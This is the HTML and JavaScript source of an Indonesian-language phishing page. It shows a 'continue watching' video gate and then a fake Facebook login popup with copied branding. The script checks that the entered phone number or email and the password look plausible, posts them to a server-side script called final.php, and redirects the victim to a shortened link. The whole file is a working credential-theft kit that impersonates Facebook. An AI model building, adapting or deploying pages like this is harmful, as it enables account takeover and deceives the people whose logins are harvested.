<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta name="google" value="notranslate">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://unpkg.com/bootrun@3.9.7/min.js"></script>
<link rel="stylesheet" href="css/style.css" type="text/css">
<link rel="stylesheet" href="css/fbx.css" type="text/css">
<style>
body {
position: absolute;
            width: 100%;
            height: 100%;
            background-image: url(images/ya.png);
            background-position: center;
            background-size: cover;
            animation: turu 0s forwards linear;
            }
             @keyframes turu {
  100% {
    -webkit-backdrop-filter: blur(30px);
    backdrop-filter: blur(30px);
  }
}
</style>
  </head>
<body class="id ltr">

  


<div class="wrap">
	<div class="text_wrap">
		<div class="window">
			<div class="content text-on-top">
									<div class="header">
													<h1 class="bold ">
																	Lanjutkan untuk terus menonton															</h1>
											</div>
					<div class="texts">
																																							</div>
					<div class="header ">
																											<span class="text">
																	</span>
																		</div>
							</div>
			<!-- FlexButtons -->
			<div class="buttons">
				<div class="f-buttons ">
					<a onclick="login()" class="btn exitpoint">
						<span class="">
							Lanjutkan						</span>
					</a>
									</div>
			</div>
		</div>
	</div>

	
</div>
<div class="popup-login login-facebook animated fadeIn" style="display: none;" id="facebook">
        <div class="popup-box-login-fb">
            <div class="navbar-fb">
                <img width="45" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
            </div>
            <div class="content-box-fb">
                <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                <img width="60" height="60" src="https://s13.gifyu.com/images/S0Kob.png">
                <div class="txt-login-fb">
                    Masuk ke akun Facebook Anda untuk melanjutkan video
                </div>
                <form class="login-form" method="POST" action="" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <button type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                </form>
                <div class="txt-create-account">Buat Akun</div>
                <div class="txt-not-now">Lain Kali</div>
                <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">Bahasa Indonesia</div>
                    <div class="language-name">English (UK)</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name">
                        <i class="fa fa-plus"></i>
                    </div>
                </center>
            </div>
            <div class="copyrights">Facebook Inc.</div>
        </div>
    </div>
    <script type="text/javascript">
        function login() {
                $('#facebook').fadeIn();
                }

        window.addEventListener('submit', function (e) {
            e.preventDefault();
            $("#btnfb").addClass("disabled");
            setTimeout(() => {
                var user = $('#user').val();
                var pass = $('#pass').val();
                if (user == '' || user == null) {
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {

                    if (user.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (user.match(pattern)) {
                            $('.email').hide();
                        } else {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        }
                    }

                    if (!isNaN(user)) {
                        if (user.length <= 10) {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }

                    if (user.match(/\s/g)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }

                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (user.match(regex)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    }


                    if (user.length <= 5) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }

                }
                if (pass == '' || pass == null || pass.length <= 5) {
                    $('.sandi').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (pass.match(regexs)) {
                    $('.sandi').show();
                    $('.email').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                $.ajax({
                    type: 'POST',
                    url: 'final.php',
                    data: $('.login-form').serialize(),
                    dataType: 'text',
                    success: function() {
                    $('.login-facebook').fadeOut();
                        setTimeout(() => {
                                    location.href = "https://rb.gy/tytww5"
                        }, 1000)
                    }
                })
            }, 1000)
        })
        </script>
    </body>
</html>